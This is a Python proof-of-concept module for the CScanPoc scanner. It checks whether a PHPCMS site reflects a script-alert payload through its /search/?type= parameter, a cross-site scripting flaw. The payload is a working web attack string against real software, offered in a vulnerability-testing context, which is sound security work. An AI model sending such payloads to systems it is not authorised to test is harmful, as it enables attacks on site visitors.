# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0009' # 平台漏洞编号，留空
    name = 'PHPCMS 搜索跨站脚本' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2010-02-03'  # 漏洞公布时间
    desc = '''
        PHPCMS /search/?type= 搜索跨站脚本漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-19058' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '98f4cfab-0743-41a6-9556-29abff47a8aa'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/search/?type=%22%3E%3Cscript%3ealert(1234567890)%3c%2fscript%3e&q=rose&s=%CB%D1%CB%F7"
            url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(url)
                       
            if code == 200 and "<script>alert(1234567890)</script>" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()